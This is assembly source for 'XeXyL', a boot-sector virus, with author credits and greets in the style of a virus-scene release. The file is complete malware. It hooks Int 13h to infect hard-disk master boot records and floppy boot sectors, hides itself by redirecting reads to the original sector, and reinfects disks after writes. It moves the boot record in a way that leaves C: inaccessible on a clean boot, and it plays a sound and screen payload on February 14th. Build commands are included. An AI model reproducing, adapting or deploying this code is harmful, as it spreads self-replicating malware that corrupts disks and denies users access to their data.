;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;Name   - XeXyL      
;Author - MetGod 
;Type   - MBR/BS 
;                
;Description     
;*-*-*-*-*-*-*       
;Stealth    -> Directs read of infected sector to original MBR/BS
;           -> If writing to MBR is attempted, machine will
;              redirect to original MBR
;              If writing to BS of a floppy, it will allow
;              write, as once its done, it will be read and thus
;              reinfected
;Floppies   -> Sectors written to Track 0, Head 1, Sector 13
;Hard Disks -> Sectors written to Track 0, Head 0, Sector 2
;Payload    -> On February 14th There is a video / sound effect if criteria
;              is met
;Anti-AV    -> Not really A-AV yet, but
;              The MBR/BS is completely moved, thus wiping the
;              partition table, so on a clean boot, C: is inaccessible
;              And of course hooks Int 13h
;Detection  -> As far as I know - only McAfee sees it but as the Max.347.
;              McAfee failed to clean it even when virus wasn't
;              even in memory..
;Anti-Detect-> None currently.. Later version if I can.. 
;Assembly   -> tasm xexyl.asm
;              tlink /t xexyl.obj
;              xexyl
;Comments   -> This is a very early version, not complete..but it has
;              some nifty stuff (such as the payload)
;*-*-*-*-*-*-*
;Thanks &   -> The_Lich, Evul, Techno Phunk, VD, Opic,
;Greets        Pax, Roadkil, Owl,Buz, MetalKid, and to
;              all the others who have helped me and just
;              been overall cool..(too many to list :)
;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*


XeXyLSeg          SEGMENT
assume         cs:XeXyLSeg,ds:XeXyLSeg,es:Xexylseg,SS:xexylseg
.286
org            0h

begin:

jmp short installXeXyL
db 3ch dup (?)

installXeXyL:
xor     di,di                           ;Clear DI
cli                                     ;clear interupt flag
mov ss,di                               ;set up
mov sp,7c00h                            ;stack
sti
mov     si,sp                           ;

push    di
pop     ds                              ; clear DS
dec     word ptr ds:[413h]              ;decrease Available mem in TOM
int     12h                             ;new size of mem..

shl     ax,6                            ;convert to paragraphs
push    ax
pop     es
mov     cx,512                          ;one sector
cld                                     ;clear directional flag
rep     movsw                           ;write us to memory

push    es                              ;save ES on stack
mov ax,offset HookInt                   ;Where we go
push    ax                              ;Save AX
retf                                    ;retreat to stack in memory

HookInt:

mov ax,word ptr ds:[13h*4]              ;Get Int 13h Vector Address
mov word ptr cs:[OldInt13],ax           ;Save Offset in variable
mov ax,word ptr ds:[13h*4+2]            ;Get Segment
mov word ptr cs:[OldInt13+2],ax        ;Save to variable
mov word ptr ds:[13h*4+2],ES            ;Set new Segment
mov word ptr ds:[13h*4],offset Int13Handler ;Int 13h handler


PayLoadCheck:
mov ah,4
int 1ah                                 ;get date
cmp dx,0214h                               ;is it the 14th..
jne ReLoad                              ;if not, forget Payload
in al,40h
or al,al
jz StartPayLoad
ReLoad:
int     19h                             ;bootstrap loader with us in memory
PayLoad: 
delay:                   
push cx                                 ;save CX
mov cx,0fffh                            ;amount of time to loop
DelayLoop:                              ;for delay
in al,4fh                               ;what we do each time for delay
loop DelayLoop                          ;loop
pop cx                                  ;retrieve CX
ret                                     ;return to caller

sound:                                  
push ax                                 ;save AX
in ax,40h                               ;get a value into AX
out 42h,al                              ;send it to 42h (for sound tone)
mov al,ah                               ;get higher bit in AL
out 42h,al                              ;send higher bit to 42h
pop ax                                  ;retrieve CX
call delay                              ;call delay
call delay                              ;call delay
out 42h,al                              ;same thing as above
mov al,ah                               ;but different tone 
out 42h,al                              ;ax is modified as video effect goes
ret                                     ;return to caller
StartPayLoad:                          ;heres where it all starts
pusha
push es
xor cx,cx                              ;clear CX for counter
in al,61h                              ;turn on speaker
or al,03h                              ;
out 61h,al                             ;
mov al,0b6h                            ;set necessary mode to send to
out 43h,al                             ;43h 
mov ax,0b800h                          ;video segment
mov es,ax                              ;ES = segment 
xor di,di                              ;clear DI (start of screen )

VideoEffect:
add di,16dh                            ;add value to DI
cmp di,1890h                           ;is new value = to 1890h
jl ContinuePay                         ;if it's < than, skip next command
sub di,1890h                           ;else subtract 1890h

ContinuePay:
mov al,es:[di]                         ;puttint video buffer (es:[di]) to AX
add ax,di                              ;modifying DI 
mov es:[di],al                         ;sending it back to video buffer
call sound                             ;call sound routine
cmp cx,5000                            ;We want to do this 5000 times
jne LoopPay                            ;if it hasn't reached it, continue on 

                                       ;takes about a minute or so to complete 
in al,61h                              ;Turn off speaker 
and al,0fdh                            ;
out 61h,al                             ;after we are done

pop es                                 ;
popa
jmp ReLoad                             ;then continue on to reload

LoopPay:                               ;here is the looper
inc cx                                 ;increase CX everytime
jmp short VideoEffect                  ;and continue until CX = 5000



Int13Handler:
cmp cx,1                                ;sector 1?
jne Exit13Handler                       ;If not, we goto original 13h handler
or  dh,dh                                ;head 0?
jnz Exit13Handler                       ;If not, we goto original 13h handler
cmp ah,2                                ;Are we reading this sector?
je  CallInt13                       ;If not, we goto original 13h handler
cmp ah,3                           ;write?
jne Exit13Handler                  ;no, give BIOS int 13h
or dl,dl                            ;floppy disk?
jns FloppyWrite                     ;Yes, allow boot write, once read again 
call ChooseSector                   ;will be re-infected
call Int13                          ;write to orignal MBR
retf 02                            ;return
FloppyWrite:                       ;floppy, let it be written
call Int13                        ;
retf 02                           ;
CallInt13:
call Int13                              ;ELSE, We use OUR int 13h handler
jnc ReadSector                          ;If no error, We continue
Exit13Handler:                          ;If there is an error, we use Original
db 0eah                                 ;Old int13h
OldInt13 dd ?                           ;Variable for our OWN
                                        ;
                                        
ReadSector:                             ;
pushf                                   ;push everything onto stack
pusha
push ds es
cmp word ptr es:[bx+offset XeXyl],'eX'  ;Disk infected?
je StealthProt                          ;Yes, then stealth it

push cs cs                              ;
pop ds es                               ;CS=DS=ES

mov bx,512                           ;read original sector to
mov ax,201h                             ;512
call Int13                              ;call int13

mov cx,3ch                              ;copy 3ch bytes for floppies
mov si,514                             ;get the bytes
mov di,2                                ;where to put them
cld                                     ;clear directional flag
rep movsb                               ;copy themover

call ChooseSector                       ;Check if HDD or Floppy
mov ax,301h                             ;to see where we write original mbr/bs
call Int13                              ;write original mbr/bs

WriteUs:
xor bx,bx                               ;clear BX (buffer)
xor dh,dh                               ;head 0
mov cx,1                                ;track 1
mov ax,301h                             ;write sector
call Int13                              ;writes us to mbr/bs
jmp short Exit                          ;exit 

StealthProt:                            ;
mov ax,201h                             ;If a read was called and already
call ChooseSector                       ;infected - then we redirect it to
call Int13                              ;original sector

Exit:
pop es ds                               ;pop all from stack
popa
popf
retf 2                                  ;done




ChooseSector:                           ;
mov cx,2                                ;We write us to sector 2
xor dh,dh
or dl,dl
js HDD
mov dh,1                                ;If its a floppy
mov cx,13h                            ;write us last head 1
HDD:                                    ;sector 13
ret                                     ;
                                        ;
Int13:                                  ;
pushf                                   ;push flags register
call dword ptr cs:[OldInt13]            ;Point to our 13h
ret                                     ;return to caller               
XeXyl db "XeXyL"                      ;Marker 

org 1feh                                ;End of first sector
db 055h,0aah                            ;Signature that is needed for disk
                                        ;to be read
XeXyLSeg ends

end        begin                        

